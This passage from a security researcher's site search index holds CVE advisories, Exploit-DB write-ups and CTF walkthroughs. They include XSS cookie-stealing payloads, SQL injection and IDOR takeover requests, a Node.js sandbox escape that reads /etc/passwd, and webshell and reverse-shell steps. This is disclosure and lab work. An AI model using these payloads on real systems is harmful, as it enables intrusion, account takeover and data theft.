var store = [{
        "title": "Lhasa Apso",
        "excerpt":"   The Lhasa Apso (/ˈlɑːsə ˈæpsoʊ/ lah-sə ap-soh) is a non-sporting dog breed originating in Tibet. It was bred as an interior sentinel in the Buddhist monasteries, to alert the monks to any intruders who entered. Lhasa is the capital city of Tibet, and apso is a word in the Tibetan language meaning “bearded”, so, Lhasa Apso simply means “long-haired Lhasa dog”. There are, however, some who claim that the word “apso” is a form of the Tibetan word “rapso”, meaning “goat-like”, which would make the equivalent translation “wooly Lhasa dog”.       From Wikipedia, the free encyclopedia   ","categories": [],
        "tags": [],
        "url": "http://localhost:4000/pets/lhasa-apso/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "Tabby",
        "excerpt":"   A tabby is any domestic cat that has a coat featuring distinctive stripes, dots, lines or swirling patterns, usually together with a mark resembling an ‘M’ on its forehead. Tabbies are sometimes erroneously assumed to be a cat breed. In fact, the tabby pattern is found in many breeds, as well as among the general mixed-breed population. The tabby pattern is a naturally occurring feature that may be related to the coloration of the domestic cat’s direct ancestor, the African wildcat, which (along with the European wildcat and Asiatic wildcat) has a similar coloration.       From Wikipedia, the free encyclopedia   ","categories": [],
        "tags": [],
        "url": "http://localhost:4000/pets/tabby/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "COMNETS LAB UNSRI - Internet of Things dataset",
        "excerpt":"COMNETS lab dataset is a collection of datasets from the Department of Computer Engineering. Faculty of Computer Science. Universitas Sriwijaya.   For further more information, kindly to contacted at comnets@unsri.ac.id   Contents     Internet of Things dataset   License   Internet of Things dataset  Contents     TCP FIN flood and zbassocflood Dataset   Ping Flood Attack Pattern Recognition on Internet of Things Network Dataset   UDP Flood Attack Pattern on Internet of Things Network Dataset   Constrained Application Protocol Internet of Things Protocol Dataset   Message Queue Telemetry Transport Protocol on Internet of Thing Dataset   TCP FIN flood and zbassocflood Dataset   This dataset is available at Zenodo, kindly to download it throught TCP FIN Flood and Zbassocflood Dataset   Publications:  The Development of an Internet of Things (IoT) Network Traffic Dataset with Simulated Attack Data.   Abstract— This research focuses on the requirements for and the creation of an intrusion detection system (IDS) dataset for an Internet of Things (IoT) network domain.  A minimal requirements Internet of Things (IoT) network system was built to produce a dataset according to IDS testing needs for IoT security. Testing was performed with 12 scenarios and resulted in 24 datasets which consisted of normal, attack and combined normal-attack traffic data.  Testing focused on three denial of service (DoS) and distributed denial of service (DDoS) attacks—“finish” (FIN) flood, User Datagram Protocol (UDP) flood, and Zbassocflood/association flood—using two communication protocols, IEEE 802.11 (WiFi) and IEEE 802.15.4 (ZigBee). A preprocessing test result obtained 95 attributes for the WiFi datasets and 64 attributes for the Xbee datasets   TCP FIN Flood Attack Pattern Recognition on Internet of Things with Rule Based Signature Analysis   Abstract-Focus of this research is TCP FIN flood attack pattern recognition in Internet of Things (IoT) network using rule based signature analysis method. Dataset is taken based on three scenario normal, attack and normal-attack. The process of identification and recognition of TCP FIN flood attack pattern is done based on observation and analysis of packet attribute from raw data (pcap) using a feature extraction and feature selection method.  Further testing was conducted using snort as an IDS. The results of the confusion matrix detection rate evaluation against the snort as IDS show the average percentage of the precision level.   Citing  Citation data : TCP FIN Flood Attack Pattern Recognition on Internet of Things with Rule Based Signature Analysis   @article{article, author = {Stiawan, Deris and Wahyudi, Dimas and Heryanto, Ahmad and Sahmin, Samsuryadi and Idris, Yazid and Muchtar, Farkhana and Alzahrani, Mohammed and Budiarto, Rahmat}, year = {2019}, month = {04}, pages = {124}, title = {TCP FIN Flood Attack Pattern Recognition on Internet of Things with Rule Based Signature Analysis}, volume = {15}, journal = {International Journal of Online and Biomedical Engineering (iJOE)}, doi = {10.3991/ijoe.v15i07.9848} }   Features Extraction on IoT Intrusion Detection System Using Principal Components Analysis (PCA)   Feature extraction solves the problem of finding the most efficient and comprehensive set of features. A Principle Component Analysis (PCA) feature extraction algorithm is applied to optimize the effectiveness of feature extraction to build an effective intrusion detection method. This paper uses the Principal Components Analysis (PCA) for features extraction on intrusion detection system with the aim to improve the accuracy and precision of the detection. The impact of features extraction to attack detection was examined. Experiments on a network traffic dataset created from an Internet of Thing (IoT) testbed network topology were conducted and the results show that the accuracy of the detection reaches 100 percent.   Citing  Citation data : Features Extraction on IoT Intrusion Detection System Using Principal Components Analysis (PCA)   @inproceedings{inproceedings, author = {Sharipuddin, and Purnama, Benni and Kurniabudi, Kurniabudi and Winanto, Eko and Stiawan, Deris and Hanapi, Darmawiiovo and Idris, Mohd and Budiarto, Rahmat}, year = {2020}, month = {10}, pages = {114-118}, title = {Features Extraction on IoT Intrusion Detection System Using Principal Components Analysis (PCA)}, doi = {10.23919/EECSI50503.2020.9251292} }   Ping Flood Attack Pattern Recognition on Internet of Things Network Dataset   This dataset is available at Zenodo, kindly to download it throught Ping Flood Attack Pattern Recognition on Internet of Things Network dataset   Publications:  Ping Flood Attack Pattern Recognition using K-Means Algorithm in Internet of Things (IoT) Network status: on repository   Abstract — This work investigates ping flood attack pattern recognition on Internet of Things (IoT) network. Experiments are conducted on WiFi communication with three different scenarios: normal traffic, attack traffic, and normal-attack combination traffic to create normal dataset, attack dataset, and normal attack (combined) dataset. The datasets are grouped into two clusters i.e.: (i) normal cluster and (ii) attack cluster. Clustering results using implemented K-Means algorithm show the average number of packets on the cluster of attack in total is 95,931 packets, and the average packets on normal cluster in total is 4,068 packets.  Accuracy level of the clustering results then is calculated using confusion matrix equation. Based on the confusion matrix calculation, accuracy of clustering using implemented K-Means algorithm was 99.94%. The true negative rate reaches up to 98.62%, true positive rate is 100%, the false negative rate is 0%, and the false positive rate reaches 1.38%.   UDP Flood Attack Pattern on Internet of Things Network Dataset   This dataset is available at Zenodo, kindly to download it throught UDP Flood Attack Pattern on Internet of Things Network Dataset   Publications:  Investigating UDP Flood Attack Pattern on Internet of Things Network status: on review   Abstract: UDP does not have mechanism for retransmission when a transmitting error happens, it makes this protocol to be used as a DDoS attack tool against Internet of Things (IoTs) networks. This research work attempts to analyze the UDP Flood attacks packets dataset captured from an Io|T testbed network by Wireshark.  A feature extraction process on generated CSV file was performed and then the feature extraction result are examined to find patterns of UDP flood attack packet. Lastly, the patterns are visualized to provide easy pattern recognition.   Constrained Application Protocol Internet of Things Protocol Dataset   This dataset is available at Zenodo, kindly to download it throught Constrained Application Protocol (CoAP) Internet of Things Protocol Dataset   Publications  Implementation of Constrained Application Protocol on IoT using Constrained RESTful Environments Constrained Device status : on repository   This study discusses the implementation of the Constrained Application Protocol (CoAP) using Constrained RESTful Environments (CoRE) on RFC 7252 which is used as a research parameter.  The implementation of this Limited Application Protocol uses Internet of Things (IoT) technology. The testing technique is carried out offline and the device used is based on the constrained device. Network performance testing parameters in this study are UDP throughput, UDP delay, UDP packet loss and UDP packet delivery ratio. Testing network performance with LED and Buzzer output produces the largest average UDP throughput, namely 4.5737 Kbps while the smallest average throughput is 1.2293 Kbps, the largest average UDP delay result is 2 seconds and the smallest average is 0.6 seconds, then the average UDP packet loss yield is 0% while the average successful packet delivery ratio is 100%. From the results of this test, the Constrained Application Protocol (CoAP) has smaller network performance results than the HyperText Transfer Protocol (HTTP) to be implemented in Internet of Things (IoT) technology.   Message Queue Telemetry Transport Protocol on Internet of Thing Dataset   This dataset is available at Zenodo, kindly to download it throught Message Queue Telemetry Transport (MQTT) Protocol on Internet of Thing Dataset   Publications  Performance Analysis of Message Queue Telemetry Transport (MQTT) Protocol on Internet of Thing (IoT) status : on review   Internet of Things (IoT) is a system where devices are connected and allows information exchange among them. It also allows devices/objects to interact directly with other objects or commonly refers to Machine-to-Machine (M2M) communication. Message Queue Telemetry Transport (MQTT) is machine-to-machine connectivity protocol, which is designed as messages delivery service that gives different level of Quality of Service (QoS) i.e.: level 0, 1 and 2 for variety of use cases, provides architecture of publish/subscribe and supports multicasting message. The importance feature of MQTT is low overhead for efficient communication between devices.  This work implements MQTT using Mosquito Broker, which has a function to regulate the delivery of messages between Publisher and Subscriber using poll system call to handle multiple network socket in one thread. With a scenario of increasing number of nodes at each experiment, MQTT Protocol has an average overall delay of 0.0029 seconds, an average throughput of 218 Kbps, average of packet loss of 0.2% and average of packet delivery ratio of 99.7%. Of experiment results obtained, the MQTT Protocol has potential to be able to meet the needs of the use of a limited bandwidth network, which can be adjusted with the level of service provided by the MQTT and low packet loss rate.   License     You may redistribute, republish, and mirror all of the COMNETS Lab datasets in any form. However, any use or redistribution of the data must include a citation to our publications or the COMNETS Lab dataset.      ","categories": ["Machine Learning","Research"],
        "tags": ["Internet of Things","Internet of Things Datasets","Dataset","IoT","IoT Datasets"],
        "url": "http://localhost:4000/portfolio/2021-02-21-comnets-iot-dataset/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "Book appointment Online < 1.39 - Authenticated Stored Cross-Site Scripting (XSS)",
        "excerpt":"Description  The plugin does not sanitise or escape Service Prices before outputting it in the List, which could allow high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.   Proof of Concept  In the admin dashboard navigate to Services &gt; Add service and put the following payload in the Price (Service Params section):   &lt;script&gt;alert('test')&lt;/script&gt;  The XSS will be triggered in the Services list /wp-admin/edit.php?post_type=services   Timeline     Publicly Published : 2021-08-10 (about 1 months ago)   Added : 2021-08-10 (about 1 months ago)   Last Updated : 2021-08-10 (about 1 months ago)   Links     Book appointment Online &lt; 1.39 - Authenticated Stored Cross-Site Scripting (XSS)   CVE-2021-24614  ","categories": ["CVE"],
        "tags": ["CVE"],
        "url": "http://localhost:4000/portfolio/2021-10-01-CVE-2021-24614/",
        "teaser": "http://localhost:4000/assets/images/wordpress-plugins-vuln.jpg"
      },{
        "title": "WP Courses LMS < 2.0.44 - Authenticated Stored XSS via Video Embed Code",
        "excerpt":"Description  The plugin does not sanitise its Video Embed Code, allowing malicious code to be injected in it by high privilege users, even when the unfiltered_html capability is disallowed, which could lead to Stored Cross-Site Scripting issues   Proof of Concept  On the dashboard, navigate to WP Courses &gt; Courses &gt; Add New &gt; Video Embed Code (iframe) (in the Post settings), inject with &lt;iframe&gt; XSS payload, such as   &lt;iframe src=\"javascript:alert(document.cookie)\"&gt;&lt;/iframe&gt;;&lt;iframe src=\"javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29\"&gt;&lt;/iframe&gt;  Then, click Update, and to trigger XSS payload, open URL path of course   Timeline     Publicly Published : 2021-08-16 (about 1 months ago)   Added : 2021-08-16 (about 1 months ago)   Last Updated : 2021-08-16 (about 1 months ago)   Links     WP Courses LMS &lt; 2.0.44 - Authenticated Stored XSS via Video Embed Code   CVE-2021-24621  ","categories": ["CVE"],
        "tags": ["CVE"],
        "url": "http://localhost:4000/portfolio/2021-10-01-CVE-2021-24621/",
        "teaser": "http://localhost:4000/assets/images/wordpress-plugins-vuln.jpg"
      },{
        "title": "WP Ticket < 5.10.4 - Admin+ Stored Cross-Site Scripting",
        "excerpt":"Description  The plugin does not sanitize or escape form fields before outputting it in the List, which could allow high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.   Proof of Concept  Navigate to WP Ticket &gt; Forms &gt;  edit layout of \"Open a Ticket\" or \"Search Tickets\" &gt; on \"Editing Form\" Setting menu.   Select a form field and you can edit the “Label” with a cross-site scripting (XSS) payload such as  v &lt; 5.10.3 - \"&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;  v &lt;= 5.10.3 - \" style=animation-name:rotation onanimationstart=alert(/XSS/)//  All of the parameters on the “Editing Form” are vulnerable.To trigger the XSS payload, refresh the “Editing Form” page.   Timeline     Publicly Published : 2021-09-20 (about 11 days ago)   Added : 2021-09-20 (about 11 days ago)   Last Updated : 2021-09-20 (about 11 days ago)   Links     WP Ticket &lt; 5.10.4 - Admin+ Stored Cross-Site Scripting   CVE-2021-24622  ","categories": ["CVE"],
        "tags": ["CVE"],
        "url": "http://localhost:4000/portfolio/2021-10-01-CVE-2021-24622/",
        "teaser": "http://localhost:4000/assets/images/wordpress-plugins-vuln.jpg"
      },{
        "title": "WordPress Advanced Ticket System < 1.0.64 - Authenticated Stored Cross-Site Scripting (XSS)",
        "excerpt":"Description  The plugin does not sanitize or escape form values before saving to the database or when outputting, which allows high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.   Proof of Concept  Navigate to Tickets &gt; Add New &gt;  add all information on the title, post, Ticket type, Ticket priority, Ticket status &gt; click update and intercept the request using burp suite. The parameters \"wats_select_ticket_type\", \"wats_select_ticket_priority\", \"wats_select_ticket_status\" can be injected with cross-site scripting (XSS), such as test\"&gt;&lt;script&gt;alert('test')&lt;/script&gt;; test\"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; payload. Next Click Forward on burp suite. To trigger the XSS payload, Open the permalink post/ticket page.   Timeline     Publicly Published : 2021-08-16 (about 1 months ago)   Added : 2021-08-16 (about 1 months ago)   Last Updated : 2021-08-16 (about 1 months ago)   Links     WordPress Advanced Ticket System &lt; 1.0.64 - Authenticated Stored Cross-Site Scripting (XSS)   CVE-2021-24623  ","categories": ["CVE"],
        "tags": ["CVE"],
        "url": "http://localhost:4000/portfolio/2021-10-01-CVE-2021-24623/",
        "teaser": "http://localhost:4000/assets/images/wordpress-plugins-vuln.jpg"
      },{
        "title": "Spring Boot Log4j - CVE-2021-44228",
        "excerpt":"Description  The Log4Shell vulnerability (CVE-2021-44228) ultimately is a quite simple JNDI Injection flaw, but in a really really bad place. Log4J will perform a JNDI lookup() while expanding placeholders in logging messages (or indirectly as parameters for formatted messages) - readmore PSA: Log4Shell and the current state of JNDI injection.   For information and setup, let’s navigate to my github repository Spring Boot Log4j - CVE-2021-44228   References     Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package   PSA: Log4Shell and the current state of JNDI injection   Log4Shell sample vulnerable application (CVE-2021-44228)   JNDIExploit Update (Dec 13th): The JNDIExploit repository has been removed from GitHub  ","categories": ["CVE"],
        "tags": ["CVE","CVE-2021-44228","Log4Shell","Log4j"],
        "url": "http://localhost:4000/portfolio/2021-12-13-CVE-2021-44228/",
        "teaser": "http://localhost:4000/assets/images/log4j/log4j-apache-vulnerability-software.jpg"
      },{
        "title": "Hospitals Patient Records Management System 1.0 - Account TakeOver",
        "excerpt":"Information about vulnerability  - Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' Insecure direct object references (IDOR) leads to Account TakeOver - Date: 2021-12-30 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB link: https://www.exploit-db.com/exploits/50631   Insecure direct object references (IDOR)  Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input.Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system.   Attack Vector  An attacker can takeover the Administrator’s account   Steps of reproduce  Note: in this case, we used two users, user1 as a staff with user id ‘4’, and admin as an Administrator with user id ‘1’.     Step-1: Log in to the application using user1 account,then on the dashboard navigate to ‘My Account’ http://localhost/hprms/admin/?page=user   Step-2: Modify the username,lastname and password,then let’s intercept the request using burpsuite:   POST /hprms/classes/Users.php?f=save HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239 Content-Length: 806 Origin: http://localhost Connection: close Referer: http://localhost/hprms/admin/?page=user Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"id\"  4 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"firstname\"  user1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"lastname\"  admin -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"username\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"password\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"img\"; filename=\"\" Content-Type: application/octet-stream   -----------------------------17632878732301879013646251239--      Step-3: Change parameter id ‘4’ to id ‘1’   POST /hprms/classes/Users.php?f=save HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239 Content-Length: 806 Origin: http://localhost Connection: close Referer: http://localhost/hprms/admin/?page=user Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"id\"  1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"firstname\"  user1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"lastname\"  admin -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"username\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"password\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"img\"; filename=\"\" Content-Type: application/octet-stream   -----------------------------17632878732301879013646251239--      step-4: Click ‘Forward’ on burpsuite. Now user1 is a Administrator.  ","categories": ["Exploit-DB"],
        "tags": ["Exploit-DB"],
        "url": "http://localhost:4000/portfolio/2021-12-30-hprmsv1-0-idor/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "Hospitals Patient Records Management System 1.0 - 'id' SQL Injection (Authenticated)",
        "excerpt":"Information about vulnerability  - Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated) - Date: 2021-12-30 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB link: https://www.exploit-db.com/exploits/50630   SQL Injection  SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Hospital’s Patient Records Management System v1.0 is vulnerable to SQL injection via the ‘id’ parameter on the patient list.   Attack Vector  An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.   Steps of reproduce          Step-1: On the dashboard navigate to ‘Patient List’, then go to ‘Action’ &gt; ‘View Records’ page using the following URL: http://localhost/hprms/admin/?page=patients/view_patient&amp;id=1            Step-2: Put the SQL Injection payloads in ‘id’ field. time-based blind payload : page=patients/view_patient&amp;id=1' AND (SELECT 2664 FROM (SELECT(SLEEP(5)))ixec) AND 'XcAY'='XcAY            Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.      ","categories": ["Exploit-DB"],
        "tags": ["Exploit-DB"],
        "url": "http://localhost:4000/portfolio/2021-12-30-hprmsv1.0-sql-injection/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection",
        "excerpt":"Information about vulnerability  - Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection - Date: 05/01/20222 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15119/online-veterinary-appointment-system-using-phpoop-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/ovas.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB: https://www.exploit-db.com/exploits/50644   SQL Injection  SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Online Veterinary Appointment System 1.0 is vulnerable to ‘Multiple’ SQL injections.   Attack Vector  An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.      Appointment Requests - Vulnerable Parameter(s): id Steps of reproduce:            Step-1: On the dashboard navigate to ‘Appointment Requests’ page using the following URL: http://localhost/ovas/admin/?page=appointments, then go to ‘Action’ &gt; ‘View’.       Step-2: Put the SQL Injection payloads in ‘id’ field. time-based blind payload : page=appointments/view_details&amp;id=1' AND (SELECT 2197 FROM (SELECT(SLEEP(5)))DZwi) AND 'mQQq'='mQQq       Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.           Read more here  ","categories": ["Exploit-DB"],
        "tags": ["Exploit-DB"],
        "url": "http://localhost:4000/portfolio/2022-01-05-ovas-v1.0-multiple-sql-injection/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)",
        "excerpt":"Information about vulnerability  - Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated) - Date: 07/01/2022 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/orrs.zip - Version: v1.0 - Tested on: Kali Linux 2021.4,PHP 7.4.26 - Exploit-DB: https://www.exploit-db.com/exploits/50646   SQL Injection  SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to it’s database. Online Railway Reservation System v1.0 is vulnerable to SQL injection via the ‘id’ parameter on the Reservation Form.   Attack Vector  An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.   Steps of reproduce          Step-1: Navigate to ‘Schedule’ &gt; go to ‘Book’ or ‘Revervation Form’ page using the following URL: http://localhost/orrs/?page=reserve&amp;sid=1            Step-2: Put the SQL Injection payloads in ‘id’ field. In this we used time-based blind payload: /orrs/?page=reserve&amp;sid=1') AND (SELECT 6842 FROM (SELECT(SLEEP(5)))UsWr) AND ('WBCm'='WBCm            Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.      ","categories": ["Exploit-DB"],
        "tags": ["Exploit-DB"],
        "url": "http://localhost:4000/portfolio/2022-01-07-orrsv1.0-sql-injection/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "TryHackMe - Startup",
        "excerpt":"The introduction from THM’s Startup room. “We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren’t sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root”. Good luck!_      Summary   Startup machine is an easy machine from TryHackMe, we need to learn how to enumeration ftp anonymous login, listing directory path from website, put and run a shellcode to target machine via ftp upload, read and analyze TCP/IP traffic from pcapng/pcap file using wireshark, and for privilege escalation is how to  bypass a script program to create our reverse shell   Network Scanning   nmap scanning   ┌──(twseptian㉿lab)-[~/lab/TryHackMe/rooms/startup] └─$ sudo nmap -sC -sV -T4 -A 10.10.177.173 -oA startup.nmap [sudo] password for twseptian:  Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-05 14:07 WIB WARNING: RST from 10.10.177.173 port 21 -- is this port really open? Nmap scan report for 10.10.177.173 Host is up (0.21s latency). Not shown: 997 closed ports PORT   STATE SERVICE VERSION 21/tcp open  ftp     vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable] | -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg |_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt | ftp-syst:  |   STAT:  | FTP server status: |      Connected to 10.9.19.3 |      Logged in as ftp |      TYPE: ASCII |      No session bandwidth limit |      Session timeout in seconds is 300 |      Control connection is plain text |      Data connections will be plain text |      At session startup, client count was 2 |      vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA) |   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA) |_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519) 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Maintenance No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=12/5%OT=21%CT=1%CU=39056%PV=Y%DS=2%DC=T%G=Y%TM=5FCB31E OS:2%P=x86_64-pc-linux-gnu)SEQ(CI=RD%TS=A)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI= OS:I%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)OPS(O1=M505ST11NW6%O OS:2=%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF OS:%W2=0%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNS OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y% OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR% OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40% OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G% OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)  Network Distance: 2 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 993/tcp) HOP RTT       ADDRESS 1   271.16 ms 10.9.0.1 2   271.22 ms 10.10.177.173  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.90 seconds     Enumeration   ftp enumeration using anonymous login, and check directory      download notice.txt file      notice.txt file      let’s enumerate web’s directory using ffuf      ┌──(twseptian㉿lab)-[~/lab/TryHackMe/rooms/startup] └─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://10.10.177.173/FUZZ -mc 200,301 -fs 808                                     1 ⨯          /'___\\  /'___\\           /'___\\               /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/               \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\               \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/                \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                  \\/_/    \\/_/   \\/___/    \\/_/                v1.1.0-git ________________________________________________   :: Method           : GET  :: URL              : http://10.10.177.173/FUZZ  :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Response status: 200,301  :: Filter           : Response size: 808 ________________________________________________  files                   [Status: 301, Size: 314, Words: 20, Lines: 10] :: Progress: [87664/87664] :: Job [1/1] :: 159 req/sec :: Duration: [0:09:11] :: Errors: 0 ::   webfile directory /files      upload webshell php file to upload directory      click our php shell code,      and create reverse connection      list www-data’s directory      recipe.txt   $ cat recipe.txt Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love. $    incidents directory      download pcapng file and open using wireshark,and right click follow&gt; TCP Stream      username: lennie  password: c4ntg3t3n0ughsp1c3         user.txt  THM{03ce3d619b80ccbfb3b7fc81e46c0e79}   Privilege Escalation   upload and linpeas.sh script, we will found a writables file is print.sh      add bash tcp reverse shell, and we need to waiting print.sh will be execute from root         we can get root.txt     ","categories": ["TryHackMe"],
        "tags": ["wireshark","pcap analysis"],
        "url": "http://localhost:4000/tryhackme/thm-startup/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "HackTheBox Business CTF 2021 - Discordvm (Misc)",
        "excerpt":"Discordvm is a misc challenge from HackTheBox Business CTF 2021. This challenge is talking about how to vm module breakout on nodejs.   Click challenge information    Click the url, it will navigate to a discord channel    Let’s send a message to discordvm    when we to execute the program using with !calc, for example !calc 1+1 will show the output from discordvm 1+1=2. Let’s analyze the source codes  const vm = require('vm'); const payload = '1+1'; console.log(vm.runInNewContext(payload));  and we follow the intructions from NodeJS Red Team Cheat Sheet or Sandboxing NodeJS is hard, here is why   vm module breakout (by pwnisher)  \"use strict\"; const vm = require(\"vm\"); const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()`); console.log(xyz);  we need this const  process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()  we got an error    modify without whitespace like this  process=this.constructor.constructor('return(this.process)')();process.mainModule.require('child_process').execSync('cat${IFS}flag.txt').toString()    ","categories": ["HackTheBox","HackTheBox Business CTF 2021","CTF"],
        "tags": ["HackTheBox Business CTF 2021"],
        "url": "http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-discordvm/",
